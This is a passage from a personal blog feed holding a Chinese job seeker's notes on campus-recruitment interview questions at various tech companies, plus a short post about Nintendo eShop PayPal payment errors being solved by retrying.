MVC<ul><li>启动流程</li><li>内置过滤器有哪些，怎么写过滤器</li></ul></li><li>计算机网络<ul><li>域名劫持</li><li>DNS 查询过程</li><li>中间人攻击及解决方法</li></ul></li><li>做算法题的收获<ul><li>哪些东西让你豁然开朗</li><li>数据结构&#x2F;算法的具体应用场景</li></ul></li><li>项目中有成就感的事</li><li>Redis<ul><li>哨兵机制</li><li>加快缓存（访问 key 的速度）</li></ul></li></ol><p><strong>二面</strong></p><ol><li>自我介绍</li><li>有没有了解其他链路追踪工具（Skywalking）</li><li>最有挑战的项目</li><li>最有成就感的经历</li><li>如何解决分歧</li><li>意向城市</li><li>期望薪资</li><li>职业规划</li><li>反问<ul><li>新人培训<ul><li>7 月中旬入职，一个月培训（思维转变、技术培训）</li><li>教育部门 10 月中旬会到一线高校部署，获得产品反馈<ul><li>技术分享：BG、训练营</li></ul></li></ul></li><li>编程语言和框架<ul><li>大前端：IOS、Android、HTML5</li><li>服务端：Java（工程）、Golang（中间件）、C++（AI 引擎）<ul><li>框架：SpringBoot</li><li>RPC：基于 Dubbo 扩展</li><li>网关：自研</li><li>追踪：引入 Skywalking、接 ELK</li><li>熔断等，注册中心 Zookeeper</li><li>消息队列：RocketMQ（业务）、Kafka（日志）</li><li>数据库：MySQL、MongoDB、ElasticSearch</li></ul></li></ul></li><li>教育部门，14 个组，按需求-意愿-画像分配</li></ul></li></ol><p><strong>HR 面</strong></p><ol><li>自我介绍</li><li>项目中最有成就感的事情</li><li>项目中遇到的困难</li><li>合作与分工</li><li>问题<ul><li>业务：教育bg，入职分配</li><li>工作地点：合肥本部，武汉研发中心，西安研发中心</li></ul></li></ol><h2 id="微软"><a href="#微软" class="headerlink" title="微软"></a>微软</h2><p>10.1 和大家一起挂了。</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>算法：解析 JSON 字符串</li><li>如何实现 Lambda 优化</li><li>Java 程序分析系统介绍</li></ol><p><strong>二面</strong></p><ol><li>自我介绍</li><li>重点项目介绍（链路追踪）<ul><li>如何传递追踪信息</li><li>谁来生成 id，什么算法</li><li>如何注入 RPC 调用</li></ul></li><li>算法：实现 <code>hasNext</code>（幂等）、<code>next</code> 函数</li></ol><h2 id="亚马逊"><a href="#亚马逊" class="headerlink" title="亚马逊"></a>亚马逊</h2><p>两连面，无后续消息，默认挂了。</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>亚马逊全栈项目介绍<ul><li>背景</li><li>实现</li><li>优化</li></ul></li><li>转正失败的原因 </li><li>算法：输入 2 个日志文件，根据 IP 分组统计事务的平均耗时</li></ol><p><strong>二面</strong></p><ol><li>英文<ul><li>自我介绍</li><li>算法题用的语言：C++，在不同的项目中使用不同的语言</li></ul></li><li>亚马逊全栈项目介绍（选型）</li><li>BQ 问题<ul><li>开发过什么自动化工具，帮助团队提高效率</li><li>团队遇到分歧如何解决（如何分工）</li></ul></li><li>算法：输入 2 个日志文件，根据 IP 分组统计事务的平均耗时</li><li>反问：部门组织<ul><li>AWS service (AWS-CP-Platform)</li><li>Global Team</li><li>Last Mile Engine</li></ul></li></ol><h2 id="蚂蚁"><a href="#蚂蚁" class="headerlink" title="蚂蚁"></a>蚂蚁</h2><p>面试官似乎在蚂蚁呆了五六年，做 Service Mesh 相关内容。我个人比较感兴趣，但是当时还没怎么准备 Java😢</p><p><strong>电话面</strong></p><ol><li>面试官介绍：可信团队技术部-基础设施<ul><li>PaaS</li><li>K8s、安全容器</li><li>存储</li><li>中间件：研发框架，分布式应用研发、交互</li></ul></li><li>自我介绍</li><li>全栈项目介绍</li><li>如何学习新技术</li><li>最近在读的内容</li><li>Java<ul><li>如何实现多线程并发</li><li>垃圾回收机制</li></ul></li><li>反问<ul><li>技术栈、框架</li><li>新人培训机制</li></ul></li></ol><h2 id="拼多多"><a href="#拼多多" class="headerlink" title="拼多多"></a>拼多多</h2><p>秋招技术岗只有内推，麻烦校友推荐了，虽然钱给得多但 996 实在劝退。面试官问我是否真的想做工程，同时表示做工程的女生少😓</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>线程之间共享什么资源</li><li>Java 的垃圾回收算法、垃圾收集器</li><li>序列化与反序列化的用途、方式</li><li>是否了解 ProtoBuf</li><li>gRPC、Thrift、Dubbo</li><li>基于 Java 语言设计序列化和反序列化协议，需要解决哪些问题</li><li>RPC 调用的流程</li><li>MySQL<ul><li>查询语句执行流程</li><li>查询使用哪个索引，回表</li><li>主键索引的数据结构，存储的内容</li></ul></li><li>区块链都有哪些内容</li><li>Linux 加载到内存的布局，内存区域</li><li>Java 程序分析系统介绍<ul><li>什么是反序列化漏洞</li></ul></li><li>算法：最大子序列和（区间端点）</li><li>反问<ul><li>新人培训机制：技术、企业文化，由师傅带</li><li>大部门招人</li><li>技术栈：业务（Java）、引擎（C++）</li><li>大小周还是固定六天：996</li></ul></li></ol><p><strong>二面</strong></p><ol><li>自我介绍</li><li>每个项目的难点介绍</li><li>设计 Redis&#x2F;HashMap 持久化（数据结构，如何写入文件）</li><li>HashMap 底层</li><li>设计：插入&#x2F;删除&#x2F;随机选取，O(1)</li><li>算法：二叉树的序列化和反序列化</li><li>反问：大组招人</li></ol><h2 id="带动热潮"><a href="#带动热潮" class="headerlink" title="带动热潮"></a>带动热潮</h2><p>牛客网投递，面试比较水，HR 挺有意思（褒义）。</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>链路追踪项目介绍<ul><li>网络虚拟化（Neutron）</li><li>如何保证 traceID 不重复：UUID</li><li>如何实现多进程追踪</li></ul></li><li>大文件 topK：排序、分片、小根堆</li><li>反问<ul><li>工作内容：K8S、Java&#x2F;Python，即时通信（并发、可用），算法（NLP、图像处理）</li><li>是否有人指导：没有大厂的新人培训机制</li><li>多久出结果</li></ul></li></ol><h2 id="快手"><a href="#快手" class="headerlink" title="快手"></a>快手</h2><p>面试笑嘻嘻，反手给人挂🙁</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>链路追踪系统介绍</li><li>Java 程序分析系统介绍、解释反序列化漏洞</li><li>全栈项目介绍：业务、大数据处理</li><li>探讨：日志压缩，不用解压获得对应数据</li><li>Java 锁（不了解，开始问 JVM）</li><li>GC 垃圾收集</li><li>HashMap 底层实现</li><li>哈希冲突解决方式</li><li>从右往左层序遍历<ul><li>假设每层是满的，没有则填充</li><li>方法一：放入 null 节点</li><li>方法二：根据上一层节点进行填充</li></ul></li><li>反问<ul><li>部门招人，进去再分配</li><li>新人培养机制</li><li>主要的语言和技术栈</li></ul></li></ol><h2 id="极智嘉"><a href="#极智嘉" class="headerlink" title="极智嘉"></a>极智嘉</h2><p>对接的 HR 实习生跑路，二面的面试官迟到 15 min，态度极其敷衍。</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>链路追踪系统介绍</li><li>MySQL 事务、索引、数据类型</li><li><code>char</code> 和 <code>varchar</code> 对比</li><li>Redis 适用场景、优缺点</li><li>Java 线程安全的实现方式</li><li>JVM 什么时候进行垃圾回收，如何判断对象是否存活</li><li>Spring 框架（不了解）</li><li>反问<ul><li>部门招人按组分配</li><li>一共 3 面，一周内出结果</li></ul></li></ol><p><strong>二面</strong></p><ol><li>OOP 三大特性，Java 如何实现多态</li><li>Java 相关<ul><li><code>private</code>、<code>protected</code></li><li><code>final</code> 修饰类</li><li>线程同步</li><li>网络编程</li></ul></li><li>Linux 常用命令</li><li>数据库三大范式</li><li>MySQL 索引作用</li><li>HTTP 状态码：404、500</li></ol><h2 id="字节跳动"><a href="#字节跳动" class="headerlink" title="字节跳动"></a>字节跳动</h2><p>SQL 没写出来不代表完全没接触过，不恰当地扩展一下，一时半会儿忘记某汉字怎么写就代表不会汉语？当然我没怎么复习 SQL 也是事实。</p><p>另外，业务面所谓的「知识迁移」完全就是「突发奇想」，我不做这个内容，业务也不做这个内容，真不知道是怎么想的😅</p><p>不过 HR 给人印象很好，通知和协商都很及时友好，接到 Unity 就不等这边了。</p><p><strong>一面</strong></p><ol><li>全栈项目介绍</li><li>算法：岛屿数量</li><li>设计：学生、老师、选课，ER 关系</li><li>Cookie 与 Session</li><li>Nginx 反向代理，正向代理，如何实现高并发</li><li>乐观锁&#x2F;悲观锁&#x2F;自旋锁，CAS、ABA 问题</li><li>TCP 流量控制</li><li>是否了解 Golang 的 Context</li><li>反问<ul><li>部门招人</li><li>技术栈</li><li>几轮面试</li><li>面试结果多久出</li></ul></li></ol><p><strong>二面</strong></p><ol><li>自我介绍</li><li>Java 程序分析系统介绍</li><li>进程与线程的区别</li><li>进程间通信方式</li><li>HashMap 与 ConcurrentHashMap 区别与底层实现</li><li>Spring 不了解 -&gt; AOP 与依赖注入的关系</li><li>MySQL 索引</li><li>HTTP 流程</li><li>SQL：<code>student</code>、<code>student_score</code> 没有不及格的学生姓名，总成绩 top3 的学生姓名</li><li>算法：合并 k 个有序链表</li></ol><p><strong>三面</strong></p><ol><li>自我介绍（包括优势）</li><li>实习经历打分（8&#x2F;10），为什么</li><li>技术沉淀：跟项目走</li><li>介绍链路追踪工具 Jaeger <ul><li>如何挖掘漏洞</li><li>OpenTelemetry 规范，为什么要统一规范</li><li>Jaeger 实现（功能、模块）</li></ul></li><li>全栈项目介绍：做得最有难度的点（Lambda 优化）</li><li>MySQL 联合索引设计，需要考虑什么</li><li>JVM 内存区域，划分方式（新生代、老年代）、垃圾收集为什么要暂停线程</li><li>算法：LC540</li><li>发展方向：业务&#x2F;基架，为什么</li><li>描述自己的优缺点</li><li>反问：<ul><li>业务介绍：内部分为很多项目组，北京&#x2F;上海</li><li>发展前景：抖音电商（2年），完成淘宝（20年）的 10+ 年</li></ul></li></ol><p><strong>四面（业务）</strong></p><ol><li>自我介绍</li><li>全栈项目介绍<ul><li>如何评价项目的表现情况</li><li>项目完成后有什么帮助&#x2F;改变</li><li>实习收获：锻炼快速学习能力、设计文档撰写、UI 绘制、交流能力、业务了解能力</li></ul></li><li>链路追踪系统介绍<ul><li>如何挖掘逻辑漏洞</li><li>数据库的身份伪造如何检测（？不是）</li><li>操作系统怎么实现权限认证（？账号密码、用户、用户组）</li></ul></li><li>MySQL 并发问题、隔离级别（解决什么问题、如何解决）</li><li>微信转账的隔离级别，为什么，SQL 语句怎么写<ul><li><a href="https://www.rainng.com/database-tran-isolation/">浅谈数据库事务及四种隔离级别 - 雨凝</a></li></ul></li><li>Java 垃圾回收算法（可达性分析算法，标记清除、复制、标记整理）</li><li>代码习惯<ul><li>格式化、测试覆盖率、成熟框架（避免重复造轮子）、注释与文档</li></ul></li><li>如何学习新技术<ul><li>调研设计、官方文档与示例、具体的应用代码、开源社区、有经验的开发者</li></ul></li><li>反问：业务<ul><li>抖音电商-服务体验</li><li>自我发现问题（业务功能迭代）：机制（识别、解决）</li><li>业务异常、售后技术、增量（用户、保障）</li></ul></li></ol><p><strong>HR 面</strong></p><ol><li>自我介绍</li><li>职业规划</li><li>考虑公司的哪些方面（发展前景）</li><li>对抖音电商的了解（依托抖音平台、与淘宝对比、快速发展）</li><li>手里的 offer 情况</li><li>工作地点倾向：北京、上海</li><li>内推、工作强度：通过同学朋友早有了解</li><li>学习成绩、排名等</li><li>介绍全栈项目：背景、需求、实现、解决的问题</li><li>实验室研究方向：软件安全开发</li><li>自己的优缺点</li><li>喜欢学习，都学哪些内容：论坛分享、群组分享、开源社区</li><li>之前面试官反馈完全不了解 SQL：有用但是盲写不记得，倾向于结合需求与技术文档实现</li><li>有没有投百度&#x2F;阿里&#x2F;腾讯</li><li>反问<ul><li>base 地：北京</li><li>结果多久能出：需要对齐、审批</li></ul></li></ol><h2 id="MiniMax"><a href="#MiniMax" class="headerlink" title="MiniMax"></a>MiniMax</h2><p>面试官不会 Java 却非要当场找点材料问😅</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>全栈项目介绍</li><li>算法：Trie 树</li><li>TCP&#x2F;IP：三次握手、四次挥手，流量控制、拥塞控制（算法）</li><li>Java：HashMap 底层，ArrayList 与 LinkedList 比较</li><li>Redis 数据结构及用途，底层实现，大 key 问题</li><li>MySQL 三大日志，索引结构（B&#x2F;B+&#x2F;红黑树&#x2F;哈希），MVCC，性能优化</li><li>反问<ul><li>技术栈：Golang</li><li>部门：对话系统&#x2F;AI生成，ToC，ToB，基础架构，算法</li><li>人数：加上实习生 100 多人</li><li>面试：一周出结果，至少 3 轮技术</li></ul></li></ol><h2 id="Unity-中国"><a href="#Unity-中国" class="headerlink" title="Unity 中国"></a>Unity 中国</h2><p>简历贴了 Github 账号，没想到两位面试官都看了 <a href="https://jckling.github.io/2022/05/20/Notes/23%20%E5%B1%8A%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/">23 届暑期实习面试总结</a>，还都了解到我玩 FF14🤣</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>部门介绍<ul><li>解决方案（客户需求）：引擎定制，功能、性能</li><li>引擎研发：中国版</li><li>产品研发、云服务、技术支持：Hub、少儿编程、云桌面、社区</li></ul></li><li>介绍 Java 程序分析系统<ul><li>什么是利用链</li></ul></li><li>做得比较自豪的：全栈项目，讲述 Lambda 优化</li><li>JVM 内存区域</li><li>Java 垃圾回收算法</li><li>算法：序列化和反序列化二叉树</li><li>反问：是否介意没有「C++&#x2F;C#&#x2F;图形学」基础</li></ol><p><strong>二面</strong></p><ol><li>自我介绍</li><li>算法：在排序数组中查找元素的第一个和最后一个位置</li><li>在亚马逊的实习体验</li><li>对区块链的看法</li><li>发展方向的计划（开发）</li><li>Unity 中国：独立，类似外企，没有 996，更多可以问 HR</li><li>方向介绍<ul><li>常规业务：前后端、Hub、云</li><li>中国引擎开发</li><li>技美：package</li><li>项目组：游戏开发需求、引擎定制需求</li><li>人机交互：车载，新能源汽车（小鹏）</li><li>数字孪生、工业方向、元宇宙</li></ul></li><li>反问：面试官是做什么的<ul><li>K12 中学教育</li><li>引擎定制</li><li>韩国教育集团合作</li></ul></li></ol><p><strong>三面</strong></p><ol><li>为什么想来 Unity：外企 + 上海 + 离家近 + 发展机遇</li><li>职业规划</li><li>对 Unity 的了解</li><li>觉得自己代码能力如何<ul><li>代码格式化</li><li>测试覆盖率 90%（高标准）</li><li>看过其他人的代码，不够优雅</li></ul></li><li>对什么感兴趣，为什么</li><li>前端&#x2F;引擎&#x2F;后端<ul><li>不会像互联网那么大量级</li><li>做得比较杂，啥都会接触</li><li>没有图形学基础（现学 C++&#x2F;C# 就可以）</li></ul></li><li>会写 CSS 吗，了解 <code>flexbox</code> 吗</li><li>业务<ul><li>云编辑器</li><li>元宇宙（课堂、场景）</li><li>多人对战（资产加速、权限管理）</li><li>Unity Hub</li></ul></li><li>反问<ul><li>和业务结合：全栈 + 引擎</li><li>虚拟人发展愿景（合作），主要是为了帮助开发者</li></ul></li></ol><h2 id="浪潮"><a href="#浪潮" class="headerlink" title="浪潮"></a>浪潮</h2><p>点击就送，批发价，已拒。</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>docker 常用内容：镜像、容器、网络、卷</li><li>docker 如何查看日志</li><li>描述二叉树深度优先遍历</li><li>描述二分查找</li></ol><h2 id="欧科云链"><a href="#欧科云链" class="headerlink" title="欧科云链"></a>欧科云链</h2><p>网上貌似都说区块链前景不明朗，面试体验良好，已拒。</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>不同编程语言之间的差异，为什么 C&#x2F;C++ 快</li><li>线程池执行过程、七大参数</li><li>线程池队列比较与选择</li><li>hashCode 与 equals</li><li>synchronized 与 Lock 比较</li><li>线程同步方式，wait&#x2F;nofity、park&#x2F;unpark</li><li>wait&#x2F;sleep 的区别</li><li>MySQL<ul><li>索引数据结构比较</li><li>联合索引 <code>(a,b,c)</code> 以下语句 <code>select * from table where a &gt; 10 and b &gt; 10</code> 是否用到索引</li><li>联合索引 B+ 树上的存储内容</li><li>三大日志及其作用</li><li>MVCC 如何实现</li><li>隔离级别</li><li>如何防止幻读</li></ul></li><li>系统设计：电梯调度系统（电梯、调度）</li><li>反问<ul><li>交易所，类似同花顺</li><li>组织架构<ul><li>权限验证</li><li>平台业务</li><li>策略交易</li><li>网关（防火墙、安全）</li><li>区块链</li><li>基础架构：压测（4&#x2F;5人）、稳定性（链路追踪，6人）、脚手架</li></ul></li><li>规模<ul><li>公司 2000+：产研、需求、测试等</li><li>基础架构 70&#x2F;80+</li></ul></li></ul></li></ol><p><strong>二面</strong></p><ol><li>自我介绍</li><li>HashMap 与 TreeMap</li><li>线程状态，线程池中的线程会在什么状态</li><li>关闭进程时需要执行 <code>shutdown</code> 吗</li><li>数据流存储-&gt;优先队列-&gt;堆</li><li>如何使用数组实现堆</li><li>排序稳定性，稳定排序的应用</li><li>TIME_WAIT 状态</li><li>区块链<ul><li>CA、TLS</li><li>签发过程、认证过程</li></ul></li><li>链路追踪系统 <ul><li>trace、span 等概念</li><li>跨线程传递</li><li>jaeger 架构</li><li>数据如何发送（RPC）</li><li>收集数据如何做漏洞挖掘</li></ul></li><li>Java 程序分析系统<ul><li>使用什么框架开发</li><li>收集什么信息</li><li>如何做验证</li></ul></li></ol><p><strong>三面</strong></p><ol><li>自我介绍</li><li>全栈项目介绍<ul><li>工作内容</li><li>为什么选 Redshift，底层（基于 PostgreSQL 开发）</li><li>前端直接绘制，或使用仪表板工具 QuickSight</li></ul></li><li>英文水平<ul><li>CET-6&#x2F;576</li><li>实习期间的设计文档，邮件都是英文写的</li></ul></li><li>对分布式办公的看法<ul><li>实习时没去过公司，参加过几次团建</li><li>可以线上语音&#x2F;视频交流</li></ul></li><li>是否投递北京其他大厂<ul><li>外企：撤出、冻结</li><li>百度：不喜欢其产品</li><li>京东：找实习的体验不好，工作地点太远</li><li>字节：面试看运气</li></ul></li><li>对公司的了解：Web3、区块链</li><li>反问<ul><li>业务：海外（数字货币、持牌货币）、国内（链上大数据治理）</li><li>基架：基础设施、微服务、DevOps、k8s、安全</li></ul></li></ol><p><strong>HR 面</strong></p><ol><li>自我介绍</li><li>为什么不做安全，为什么想到北邮</li><li>Java 程序分析系统<ul><li>工作内容、分工&#x2F;协作、交流模式、小组规模</li><li>不是直接安排具体课题，而是自己选定和探索</li><li>demo 扩展为系统</li></ul></li><li>全栈项目<ul><li>团队介绍（目标）、工作内容</li><li>最困难的地方：挑战，最自豪的 Lambda 函数优化</li><li>说服他人、和人交流</li></ul></li><li>为什么不想贴近业务：不想直接和外部客户打交道，内部 OK</li><li>对公司的了解：不太了解，应该不是灰色产业<ul><li>国内政策不明朗，主要面向海外</li></ul></li><li>手里的 offer 情况</li><li>反问<ul><li>北京办公楼，mentor 一起来</li><li>superNova 培训：三年内培养成大佬（硬实力、软实力）</li><li>法定带薪年假+2，每年+1</li><li>补贴：健身5k1、学习6k8</li><li>免费晚餐下午茶水果，生日礼金</li><li>base + 绩效年终，应届生一个池子</li></ul></li></ol><h2 id="ONES"><a href="#ONES" class="headerlink" title="ONES"></a>ONES</h2><p>一天三轮，过了立马接到电话约下一轮，两周后出结果，已拒。</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>介绍链路追踪系统，遇到过什么问题、如何解决</li><li>全栈项目里的数据处理：如何同步、数据如何处理、效率问题</li><li>接触过的编程语言与工具</li><li>平时怎么关注新技术，如何学习新技术</li><li>工作选择：研发、地点、业务前景、薪酬福利</li><li>反问<ul><li>业务：SaaS</li><li>组织规模：研发 300 左右</li><li>发展前景：做到国内 top1，发展海外业务</li><li>主要技术栈：golang、k8s、ES&#x2F;MySQL、Superset</li><li>面试流程：基础面 + 主管面 + HR 面</li></ul></li></ol><p><strong>二面</strong></p><ol><li>自我介绍</li><li>全栈项目（独立），如何对接需求<ul><li>设计文档：Mentor&#x2F;PM、组内汇报</li><li>具体实现：Mentor、社区</li></ul></li><li>Java 程序分析系统（协作）<ul><li>如何协作：分模块开发</li><li>如何推进：会议</li></ul></li><li>Java 程序分析系统如何改进：Spring、其他漏洞分析、语句级别分析、跨语言分析</li><li>如何学习新技术：官方示例&#x2F;文档、开源项目</li><li>工作选择：地点、研发、业务、薪酬福利</li><li>反问<ul><li>业务：B 端系统（国内&#x2F;国外）</li><li>规模：公司 600+ 人，按模块垂直划分，去年今年招人</li><li>新人培训机制：导师制、半个月课程培训、1-3 月学习期、3-5 月接手任务</li></ul></li></ol><p><strong>HR 面</strong></p><ol><li>自我介绍</li><li>对公司的了解<ul><li>SaaS，企业解决方案</li><li>目标：国内 top1，开拓国外市场</li><li>部门垂直划分</li><li>技术栈 golang + k8s</li><li>新人培训机制</li></ul></li><li>介绍最有挑战性、成就感的项目经历（全栈项目）</li><li>工作选择：地点、研发、业务、薪酬福利</li><li>一到三年的职业规划</li><li>手头有什么 offer</li><li>反问：大约 1-2 周出结果</li></ol><h2 id="金山云"><a href="#金山云" class="headerlink" title="金山云"></a>金山云</h2><p>面试体验一般，北京的工作地点在小米科技园内，已拒。</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>算法：归并排序</li><li>synchronized 与 Lock 区别</li><li>线程状态</li><li>如何查看线程状态</li><li>JVM 内存结构</li><li>NIO（不会）</li><li>volatile 关键字</li><li>线程池七大参数</li><li>创建线程的方式</li><li>是否接受武汉</li><li>反问<ul><li>部门：大数据</li><li>招聘：大数据、Java（Spring Boot、Spring Cloud）</li></ul></li></ol><p><strong>二面</strong></p><ol><li>自我介绍</li><li>介绍 Java 程序分析系统</li><li>Hash 结构，如何解决冲突，HashMap 底层实现、如何扩容</li><li>调度算法</li><li>页面置换算法</li><li>OSI 参考模型（7 层）</li><li>用过 ping 吗</li><li>常用 Linux 指令</li><li>查看网络连接情况（netstat）</li><li>equals 和 hashCode 的关系</li><li>ConcurrentHashMap 底层实现</li><li>HashSet 和 HashMap 的关系</li><li>堆内存划分方式（垃圾回收）</li><li>反问<ul><li>地点：主要是武汉、厦门，本部在北京</li><li>部门&#x2F;业务：存储、网络、CDN、计算等</li><li>分配：双向选择</li></ul></li></ol><h2 id="Flexport"><a href="#Flexport" class="headerlink" title="Flexport"></a>Flexport</h2><p>一二连面，题目不难，三面的面试官是前同事🤣。RSU 的饼很大，但还是选现金多的xd</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>设计题<ul><li>client、order、match</li><li>时间复杂度</li><li>优化：堆（完全二叉树、时间复杂度）</li></ul></li><li>反问：组织架构<ul><li>研发：操作系统、物流功能</li><li>OPS&#x2F;Operations</li></ul></li></ol><p><strong>二面</strong></p><ol><li>算法题<ul><li>L 型走法，<code>w*h</code> 大小棋盘是否能覆盖</li><li>只走一个方向是否能覆盖</li></ul></li><li>反问<ul><li>按业务（BU）组织，10+ 人</li><li>工作选择：外企、前景、地点</li><li>跨时区交流：不会很多</li><li>技术栈：Ruby、JVM、React</li><li>培训机制：manger、mentor、课程</li></ul></li></ol><p><strong>三面</strong></p><ol><li>自我介绍</li><li>面试官自我介绍</li><li>从以下四个方面介绍项目<ul><li>背景&amp;目的 background</li><li>挑战 challenge</li><li>方案 action</li><li>结果 result</li></ul></li><li>全栈项目介绍<ul><li>各个模块的选型理由：数据库、QuickSight、Lambda、Harmony、权限管理（IAM、CDK）</li><li>manager 是谁，为什么没有 return offer（哪些 LP 做得不好）</li></ul></li><li>为什么不存储在内存中，为什么要有数据库：内存放不下</li><li>MySQL 和 Redis 区别：SQL 与 NoSQL、持久化、事务<ul><li>CAP 定理</li><li>关系型数据库能实现分布式事务吗</li></ul></li><li>为什么要有传输层：可靠性<ul><li>流量控制、拥塞控制</li></ul></li><li>反问：业务<ul><li>Trade Platform</li><li>Operation Tech: on-time performance, cost-saving</li><li>类似 TMS（planning、execution），forward application</li><li>OC: document, concern, assignment（出口、进口）</li><li>目标是做成 SaaS</li></ul></li></ol><h2 id="英雄游戏"><a href="#英雄游戏" class="headerlink" title="英雄游戏"></a>英雄游戏</h2><p>面试官不开摄像头，但要求我开摄像头，面试体验较差，二面已拒。</p><p><strong>一面</strong></p><ol><li>自我介绍</li><li>全栈项目介绍</li><li>Java 程序分析系统介绍</li><li>线程池</li><li>线程安全（volatile、synchronized、Lock）<ul><li>底层</li><li>三要素：原子性、可见性、有序性</li></ul></li><li>公平锁与非公平锁实现：AQS、CAS</li><li>IO 模型<ul><li>NIO</li><li>多路复用 epoll</li><li>协程</li></ul></li><li>Redis 持久化<ul><li>RDB、AOF</li><li>阻塞</li><li>写时复制</li></ul></li><li>MySQL 索引<ul><li>优点</li><li>底层数据结构</li><li>联合索引，如何存储，是否失效</li></ul></li><li>KCP（不了解）</li><li>快排、归并，时间复杂度</li><li>三数值和（接近 target）</li><li>反问<ul><li>2 轮技术 + 1 轮 HR 面</li><li>新项目（UE）、老项目（Unity）</li><li>服务器（Java）、客户端、美术、策划</li></ul></li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>招聘信息主要从校园论坛、牛客网、Linkedin 获取，投递的全是开发岗位，部分有内推。9 月中旬实习结束后才开始准备和投递，没有做好准备就陆续开始面试了，10 月底集中两三天做银行笔试，之后持续笔试面试，期间还花了两天准备和参加中期答辩，最后终于等到了「Unity 中国」，寄出三方后拒绝了其他在流程中的。</p><p>秋招战线两个多月，零零散散也拿到十几个 offer，终于定下来了。</p>]]></content>
    
    
    <summary type="html">银行、运营商、互联网、外企</summary>
    
    
    
    <category term="Notes" scheme="https://jckling.github.io/categories/Notes/"/>
    
    
  </entry>
  
  <entry>
    <title>日区 eshop 无法使用 PayPal</title>
    <link href="https://jckling.github.io/2022/08/14/Game/NS/%E6%97%A5%E5%8C%BA%20eshop%20%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8%20PayPal/"/>
    <id>https://jckling.github.io/2022/08/14/Game/NS/%E6%97%A5%E5%8C%BA%20eshop%20%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8%20PayPal/</id>
    <published>2022-08-14T10:12:52.000Z</published>
    <updated>2023-03-06T15:01:58.468Z</updated>
    
    <content type="html"><![CDATA[<h1 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h1><ol><li>不要重复解绑和绑定 PayPal 账号</li><li>遇到 9001-9310 错误代码，只要不断重复尝试就可以成功购买</li></ol><h1 id="解决流程"><a href="#解决流程" class="headerlink" title="解决流程"></a>解决流程</h1><p>一直想凑一车人开 NS 家庭会员，终于拉够了三五好友，然后发现港服只能用信用卡</p><img src="https://s2.loli.net/2022/08/14/KWHSVOnmXod9NzG.png" width="90%"><p>而日服可以使用 PayPal 或信用卡</p><img src="https://s2.loli.net/2022/08/14/zNhQ8sWDcy7Ufed.jpg" width="60%"><p>但是日服账号绑定 PayPal 后无法购买，遇到 9001-9310 错误代码，网上搜了一圈解决方法：</p><ol><li>重复解绑和绑定：遇到 9001-1787 错误代码，PayPal 账户被冻结，得等待一两天后才能重新绑定。</li><li>更换邮箱：将 PayPal 邮箱换成了 gmail 的，仍然无法购买。</li><li>使用主机进入 eshop 购买：遇到 2813-9310 错误代码，同网页版的 9001-1787 错误代码。</li></ol><img src="https://s2.loli.net/2022/08/14/cFealAQUSg7ZRqm.jpg" width="90%"><img src="https://s2.loli.net/2022/08/14/mGov8Qtu6SkpdsB.jpg" width="90%"><p>最后，我边看 Lycoris Recoil 更新边重复点击购买，不断遇到 9001-9310 错误代码，尝试 <strong>十几次</strong> 就成功买上了……</p><p>只能说任天堂的支付接口真的很玄学，不少网友也都遇到无法购买的问题，解决办法就是重复尝试购买，总有一下可以成功购买😅</p><h1 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h1><ul><li><a href="https://pttgamer.com/NSwitch/1XzXQXCT">[問題] 跳區後綁定Paypal出現 9001-1787 無法綁</a></li><li><a href="https://www.paypal-community.com/t5/Payments-Archives/Error-9001-9310-when-buying-Nintendo-Online/td-p/1677465">Error 9001-9310 when buying Nintendo Online</a></li><li><a href="https://en-americas-support.nintendo.com/app/answers/detail/a_id/29173/kw/9001-9310/session/L3RpbWUvMTU4NTA1NzczNi9nZW4vMTU4NTA1NzczNi9zaWQvZlVtU0Z0OHZGN0FDUGFlUUFOSnQxYXF5RHBHeEtNcUdjWkJjVk5NVm1iaEVpdHJNYUxZSU1RWWp5SWJMOWZVc0JnOEFYa3JJQVFQOGNJJTdFV0V3TVRsYzkwcHo3MmtxWW5DM3RTdDRLU0hsU3doaDh5U1VNcDlNM1ElMjElMjE=">Error Code: 9001-9310</a></li></ul>]]></content>
    
    
    <summary type="html">错误代码 9001-9310、9001-1787、2813-9310</summary>
    
    
    
    <category term="Game" scheme="https://jckling.github.io/categories/Game/"/>
    
    
    <category term="Nintendo" scheme="https://jckling.github.io/tags/Nintendo/"/>
    
  </entry>
  
  <entry>
    <title>23 届暑期实习面试总结</title>
    <link href="https://jckling.github.io/2022/05/20/Notes/23%20%E5%B1%8A%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/"/>
    <id>https://jckling.github.io/2022/05/20/Notes/23%20%E5%B1%8A%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/</id>
    <published>2022-05-20T02:25:50.000Z</published>
    <updated>2022-11-30T02:43:22.000Z</updated>
    
